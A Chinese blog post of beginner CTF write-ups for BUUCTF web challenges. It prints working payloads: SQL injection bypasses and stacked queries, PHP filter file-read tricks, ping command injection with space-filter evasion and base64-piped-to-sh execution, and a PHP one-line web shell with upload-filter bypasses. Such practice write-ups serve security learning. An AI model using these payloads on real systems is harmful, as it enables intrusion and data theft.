</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/BUU-1/">陪AZ的WebBUU刷题(一)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-01-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/550880247?utm_id=0" >https://zhuanlan.zhihu.com/p/550880247?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   //SQL注入</p>

        <h1 id="一、-极客大挑战-2019-EasySQL"   >
          <a href="#一、-极客大挑战-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-极客大挑战-2019-EasySQL" class="headerlink" title="一、[极客大挑战 2019]EasySQL"></a>一、[极客大挑战 2019]EasySQL</h1>
      <p>题目是一个登录页面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281258184.png" alt="image-20220728125819044"></p>
<p>首先考虑是否是SQL注入，通过查看网页源代码发现!</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281257822.png" alt="image-20220728125729780"></p>
<p>是php写的</p>
<p>于是直接在url后面输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php? username=aa&#x27;or&#x27;a&#x27;=&#x27;a&amp;&amp;password=aa&#x27;or&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></div></figure>

<p>(PS: aa’也可以换成其他字符再加单引号‘，or后面的语句应该是始终为真，且注意加单引号，末尾的单引号不加)</p>
<p>(PS:也可以直接在登录界面输入)</p>
<p>最后解出！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281259279.png" alt="image-20220728125902175"></p>

        <h1 id="二、-极客大挑战-2019-Havefun-1"   >
          <a href="#二、-极客大挑战-2019-Havefun-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-极客大挑战-2019-Havefun-1" class="headerlink" title="二、[极客大挑战 2019]Havefun 1"></a>二、[极客大挑战 2019]Havefun 1</h1>
      <p>打开界面是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281300850.png" alt="image-20220728130052768"></p>
<p>什么提示也没有，我们可以查看一下它的网页源代码</p>
<p>在源代码的最后，可以看到这样几行注释：</p>
<p>（PS：<!--   -->是html中的注释标志）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281301266.png" alt="image-20220728130119241"></p>
<p>这是一段php代码，通过阅读发现是以GET方式传入cat,直接输出了cst的值，如果cat的值为dog，则将输出’Syc{cat_cat_cat_cat}’</p>
<p>显然，有猫腻</p>
<p>于是尝试着传入cat的值为dog，即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></div></figure>

<p>回车一下，我们可以惊讶地发现：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281302331.png" alt="image-20220728130224249"></p>
<p>它它它，它出来了！</p>
<p>解题成功！！！</p>

        <h1 id="三、-ACTF2020-新生赛-Include-1"   >
          <a href="#三、-ACTF2020-新生赛-Include-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-ACTF2020-新生赛-Include-1" class="headerlink" title="三、[ACTF2020 新生赛]Include 1"></a>三、[ACTF2020 新生赛]Include 1</h1>
      <p>刚打开就是一个很直接的画面：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281424123.png" alt="image-20220728142446965"></p>
<p>点击tips</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281619370.png" alt="image-20220728161935315"></p>
<p>显然，这是暗示，也是挑衅。注意这里的url格式，这不是文件源码，应想办法读取文件源码</p>
<p>通过查阅资料（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%89" >https://www.cnblogs.com/wjrblogs/p/12285202.html）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>于是得到</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p>此时得到一堆奇奇怪怪的东西：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281459682.png" alt="image-20220728145944523"></p>
<p>这是base64的编码输出，可以借助Cyberchef解密</p>
<p>得：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281502243.png" alt="image-20220728150227071"></p>
<p>最终，成功找出flag！</p>
<p>解出！</p>

        <h1 id="四、-强网杯-2019-随便注-1"   >
          <a href="#四、-强网杯-2019-随便注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-强网杯-2019-随便注-1" class="headerlink" title="四、[强网杯 2019]随便注 1"></a>四、[强网杯 2019]随便注 1</h1>
      <p>打开后界面如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281508416.png" alt="image-20220728150850249"></p>
<p>首先尝试一下提交 </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></div></figure>

<p>于是出现</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281509707.png" alt="image-20220728150904532"></p>
<p>再用单引号判断是否有sql注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281509461.png" alt="image-20220728150949317"></p>
<p>出错了，则说明有sql注入</p>
<p>（PS：用单引号判断是否有sql注入，即在参数后面加上单引号，如果页面返回错误，则存在。会因为单引号个数不匹配而报错）</p>
<p>再查询一下表</p>
<p>（PS：在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，在分号后面加#，则表示结束）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281520159.png" alt="image-20220728152001997"></p>
<p>再分别查看表的结构</p>
<p>1919810931114514:</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></div></figure>

<p>(PS:表名为数字时，要用反引号)</p>
<p>(数字前后是反单引号，不是单引号)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281521757.png" alt="image-20220728152100582"></p>
<p>words:</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from words;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281521643.png" alt="image-20220728152143473"></p>
<p>显然，flag存在于1919810931114514表中</p>

        <h3 id="法Ⅰ：可以通过修改表名来获取flag"   >
          <a href="#法Ⅰ：可以通过修改表名来获取flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：可以通过修改表名来获取flag" class="headerlink" title="法Ⅰ：可以通过修改表名来获取flag"></a>法Ⅰ：可以通过修改表名来获取flag</h3>
      <p>将表1919810931114514的名字改为words,flag列名字改为id，就能获取flag</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30);</span><br></pre></td></tr></table></div></figure>

<p>即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;；alter table words rename to word1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</span><br></pre></td></tr></table></div></figure>

<p>最后再输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281537442.png" alt="image-20220728153711380"></p>

        <h3 id="法Ⅱ：利用open和handler"   >
          <a href="#法Ⅱ：利用open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用open和handler" class="headerlink" title="法Ⅱ：利用open和handler"></a>法Ⅱ：利用open和handler</h3>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;#</span><br></pre></td></tr></table></div></figure>

<p>（PS：a可随意变换名称）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281528838.png" alt="image-20220728152844776"></p>

        <h3 id="法Ⅲ：MySQL的预处理"   >
          <a href="#法Ⅲ：MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：MySQL的预处理" class="headerlink" title="法Ⅲ：MySQL的预处理"></a>法Ⅲ：MySQL的预处理</h3>
      <p>尝试一下输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281531577.png" alt="image-20220728153131520"></p>
<p>得出括号里的一堆都被过滤掉了，可以利用预处理机制prepare和concat函数拼接获得select，再用exeute来执行，通过大写绕过</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;PREPARE st from concat(&#x27;sel&#x27;,&#x27;ect&#x27;,  &#x27;* from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>

<p>（PS：括号里前两个单引号的内容合在一起应该是被过滤掉的东西，但必须分开）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281532121.png" alt="image-20220728153220056"></p>
<p>OVER！</p>

        <h1 id="五、-ACTF2020-新生赛-Exec-1"   >
          <a href="#五、-ACTF2020-新生赛-Exec-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-ACTF2020-新生赛-Exec-1" class="headerlink" title="五、[ACTF2020 新生赛]Exec 1"></a>五、[ACTF2020 新生赛]Exec 1</h1>
      <p>点开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281542627.png" alt="image-20220728154217574"></p>
<p>ping，命令执行</p>
<p>直接输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281546660.png" alt="image-20220728154658611"></p>
<p>flag就来了 </p>
<p>PS:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping ;ls   打开当前根目录</span><br><span class="line">ping ;ls \  列出根目录\下的所有目录</span><br><span class="line">ping ;cat \ 打开\下的文件</span><br></pre></td></tr></table></div></figure>

<p>附：ping命令</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_50317371/article/details/110489711" >https://blog.csdn.net/m0_50317371/article/details/110489711</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="六、-极客大挑战-2019-Secret-File-1"   >
          <a href="#六、-极客大挑战-2019-Secret-File-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-极客大挑战-2019-Secret-File-1" class="headerlink" title="六、[极客大挑战 2019]Secret File 1"></a>六、[极客大挑战 2019]Secret File 1</h1>
      <p>打开就是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281554720.png" alt="image-20220728155426652"></p>
<p>熟练的查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555520.png" alt="image-20220728155505451"></p>
<p>点开瞧一瞧</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555262.png" alt="image-20220728155519172"></p>
<p>再点击SECRET瞧一瞧</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555511.png" alt="image-20220728155533470"></p>
<p>果然，没那么简单~但这也是一种提示吧，让我们再回去即上一个界面看看</p>
<p>抓个包试试</p>
<p>(方法:退回上一界面，开启proxy，再点击SECRET)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281616889.png" alt="image-20220728161627792"></p>
<p>这已经是很明显的提示了，访问一下这个secr3t.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281617712.png" alt="image-20220728161702651"></p>
<p>更明显了这个</p>
<p>和“三”同理，读取文件源码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281625622.png" alt="image-20220728162456844"></p>
<p>便出现了一串长长长长长长的字符，再利用CyberChef解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281625219.png" alt="image-20220728162540153"></p>
<p>这不就来了？</p>

        <h1 id="七、-GXYCTF2019-Ping-Ping-Ping-1"   >
          <a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="七、[GXYCTF2019]Ping Ping Ping 1"></a>七、[GXYCTF2019]Ping Ping Ping 1</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281627904.png"></p>
<p>显然，由题名可得又是命令执行</p>
<p>打开一下当前目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281627727.png" alt="image-20220728162755671"></p>
<p>尝试打开flag文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281628024.png" alt="image-20220728162829966"></p>
<p>space表明网站对空格进行了过滤，应该想办法绕过空格，方法有：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS  //此题不行</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></div></figure>

<p>于是我们尝试输入</p>
<p><code>/?ip=;cat$IFS$1flag.php</code></p>
<p>然鹅</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281629238.png" alt="image-20220728162923192"></p>
<p>flag也被过滤了</p>

        <h3 id="法Ⅰ：用其他变量把flag拼接"   >
          <a href="#法Ⅰ：用其他变量把flag拼接" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：用其他变量把flag拼接" class="headerlink" title="法Ⅰ：用其他变量把flag拼接"></a>法Ⅰ：用其他变量把flag拼接</h3>
      <p>即：用某一变量代替flag中的某一部分</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;b=g;cat$IFS$1fla$b.php  //$b即g</span><br></pre></td></tr></table></div></figure>

<p>回车后查看网页源代码</p>
<p>!<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281631585.png" alt="image-20220728163134531"></p>

        <h3 id="法Ⅱ：对cat-flag-php进行base64加密"   >
          <a href="#法Ⅱ：对cat-flag-php进行base64加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：对cat-flag-php进行base64加密" class="headerlink" title="法Ⅱ：对cat flag.php进行base64加密"></a>法Ⅱ：对cat flag.php进行base64加密</h3>
      <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141529604.png" alt="image-20220114152923516"></p>
<p>由于过滤掉了bash，就用sh</p>
<p>即输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></div></figure>

<p>回车后查看网页源代码</p>
<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141532132.png" alt="image-20220114153215098"></p>

        <h3 id="法Ⅲ：内联执行"   >
          <a href="#法Ⅲ：内联执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：内联执行" class="headerlink" title="法Ⅲ：内联执行"></a>法Ⅲ：内联执行</h3>
      <p>反引号内的命令优先执行</p>
<p>举个栗子：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ a=flag;</span><br><span class="line">cat `echo $a` //即cat flag</span><br></pre></td></tr></table></div></figure>

<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat$IFS$1`ls`   //因为flag本就在当前根目录下，所以反引号内为ls</span><br></pre></td></tr></table></div></figure>

<p>回车后查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281637876.png" alt="image-20220728163746817"></p>
<p>都有了</p>

        <h1 id="八、-极客大挑战-2019-Knife-1"   >
          <a href="#八、-极客大挑战-2019-Knife-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-极客大挑战-2019-Knife-1" class="headerlink" title="八、[极客大挑战 2019]Knife 1"></a>八、[极客大挑战 2019]Knife 1</h1>
      <p>打开后就是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281638623.png" alt="image-20220728163823560"></p>
<p>本身的题目名加上打开界面的“菜刀”，已经在明示了使用菜刀，蚁剑也可</p>
<p>界面已经提示密码是Syc了</p>
<p>打开蚁剑，添加数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312020462.png" alt="image-20220731202004334"></p>
<p>添加完毕后选择“文件管理”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312020456.png" alt="image-20220731202040332"></p>
<p>在文件中可以看见有flag文件</p>
<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201151650024.png" alt="image-20220115164959958"></p>
<p>点击后发现flag就在文件内</p>
<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201151650572.png" alt="image-20220115165027520"></p>
<p>成功！</p>

        <h1 id="九、-极客大挑战-2019-Http-1"   >
          <a href="#九、-极客大挑战-2019-Http-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-极客大挑战-2019-Http-1" class="headerlink" title="九、[极客大挑战 2019]Http 1"></a>九、[极客大挑战 2019]Http 1</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312052122.png" alt="image-20220731205236040"></p>
<p>查看网页源代码后发现有个Secret.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312053672.png" alt="image-20220731205323610"></p>
<p>访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312054384.png" alt="image-20220731205406216"></p>
<p>看来是要从图上的网站访问才行</p>

        <h3 id="法Ⅰ：利用插件HackBar"   >
          <a href="#法Ⅰ：利用插件HackBar" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：利用插件HackBar" class="headerlink" title="法Ⅰ：利用插件HackBar"></a>法Ⅰ：利用插件HackBar</h3>
      <p>F12点击这个后选择HackBar</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312055825.png" alt="image-20220731205506778"></p>
<p>添加Header</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312118505.png" alt="image-20220731211802447"></p>
<p>（URL就是当前网址）</p>
<p>再点击EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312118635.png" alt="image-20220731211859524"></p>
<p>看来，还得改一下User-Agent</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312120997.png" alt="image-20220731212058923"></p>
<p>点击EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312121339.png" alt="image-20220731212129226"></p>
<p>要求还蛮多，那就再改一改X-Forwarded-For</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312122412.png" alt="image-20220731212206349"></p>
<p>点击EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312122684.png" alt="image-20220731212217561"></p>
<p>出来了</p>

        <h3 id="法Ⅱ：利用Burp-Suite"   >
          <a href="#法Ⅱ：利用Burp-Suite" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用Burp-Suite" class="headerlink" title="法Ⅱ：利用Burp Suite"></a>法Ⅱ：利用Burp Suite</h3>
      <p>先是抓包，然后鼠标右键选择</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312125764.png" alt="image-20220731212517663"></p>
<p>再和法Ⅰ步骤类似，修改Referer和User-Agent，并添加X-Forwarded-For</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221624.png" alt="image-20220731222135588"></p>
<p>“GO”！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221855.png" alt="image-20220731222150813"></p>
<p>GO成功！</p>

        <h1 id="十、-极客大挑战-2019-Upload-1"   >
          <a href="#十、-极客大挑战-2019-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-极客大挑战-2019-Upload-1" class="headerlink" title="十、[极客大挑战 2019]Upload 1"></a>十、[极客大挑战 2019]Upload 1</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457650.png" alt="image-20230917144537665"></p>
<p>提示我们上传图片文件，用记事本写一个一句话木马并将格式改为jpg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457252.png" alt="image-20230917144725558"></p>
<p>上传后提示我们</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457851.png" alt="image-20230917144756129"></p>
<p>那就只能在记事本里改为：</p>
<p><code>GIF89a</code></p>
<p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[shell]);&lt;/script&gt;</code></p>
<p>重新上传后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457999.png" alt="image-20230917145159795"></p>
<p>说明我们成功绕过检测，抓包一下，更改文件后缀名为.phtml</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171500511.png" alt="image-20230917150048441"></p>
<p>然后我们可以试着用蚁剑连接一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171505712.png" alt="image-20230917150525660"></p>
<p>可以看到连接成功</p>
<p>添加数据右键进入文件管理找flag（一般flag文件在根目录）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506797.png" alt="image-20230917150631727"></p>
<p>点击flag即可拿到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506518.png" alt="image-20230917150646459"></p>

        <h1 id="十一、-ACTF2020-新生赛-Upload-1"   >
          <a href="#十一、-ACTF2020-新生赛-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-ACTF2020-新生赛-Upload-1" class="headerlink" title="十一、[ACTF2020 新生赛]Upload 1"></a>十一、[ACTF2020 新生赛]Upload 1</h1>
      <p>打开后鼠标移到灯泡那里会有上传提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171515429.png" alt="image-20230917151504289"></p>
<p>选择上一题的test.jpg进行上传，然后抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171517549.png" alt="image-20230917151747480"></p>
<p>可以看到上传成功，文件后缀改成phtml再试试，也是成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171524639.png" alt="image-20230917152447561"></p>
<p>尝试一下用蚁剑连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171530781.png" alt="image-20230917153003714">也是连接成功，同[极客大挑战 2019]Upload 1找到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171531922.png" alt="image-20230917153102858"></p>

        <h1 id="十二、-GXYCTF2019-BabyUpload-1"   >
          <a href="#十二、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十二、[GXYCTF2019]BabyUpload 1"></a>十二、[GXYCTF2019]BabyUpload 1</h1>
      <p>依然是上传题</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201511645.png" alt="image-20230920151158606"></p>
<p>试着上传test.jpg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201512570.png" alt="image-20230920151233540"></p>
<p>上传成功，我们抓包改一下文件后缀为phtml</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201514612.png" alt="image-20230920151451582"></p>
<p>看来不太行</p>
<p>但是这道题打开环境之前有个网站提示点进去查看exp.py文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201516206.png" alt="image-20230920151656161"></p>
<p>上网查了一下发现是要先配置文件，得先上传.htaccess文件，并且内容为</p>
<p><code>SetHandler application/x-httpd-php</code></p>
<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20230920151948753.png" alt="image-20230920151948753"></p>
<p>没上传成功，抓包改一下“Content-Type”为image/jpeg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521467.png" alt="image-20230920152129426"></p>
<p>发现上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521478.png" alt="image-20230920152157429"></p>
<p>再将test.jpg上传</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525594.png" alt="image-20230920152514565"></p>
<p>发现上传成功（在URL中去掉/var/www/html）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525182.png" alt="image-20230920152551144"></p>
<p>再到蚁剑连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527023.png" alt="image-20230920152721974"></p>
<p>连接成功！</p>
<p>添加数据后查看flag文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527736.png" alt="image-20230920152756697"></p>
<p>OVER！</p>

        <h1 id="十三、-MRCTF2020-你传你🐎呢-1"   >
          <a href="#十三、-MRCTF2020-你传你🐎呢-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、-MRCTF2020-你传你🐎呢-1" class="headerlink" title="十三、[MRCTF2020]你传你🐎呢 1"></a>十三、[MRCTF2020]你传你🐎呢 1</h1>
      <p>同 十二、[GXYCTF2019]BabyUpload 1</p>

        <h1 id="十四、-HCTF-2018-WarmUp-1"   >
          <a href="#十四、-HCTF-2018-WarmUp-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、-HCTF-2018-WarmUp-1" class="headerlink" title="十四、[HCTF 2018]WarmUp 1"></a>十四、[HCTF 2018]WarmUp 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112268.png" alt="image-20240102111212097"></p>
<p>查看网页源代码</p>
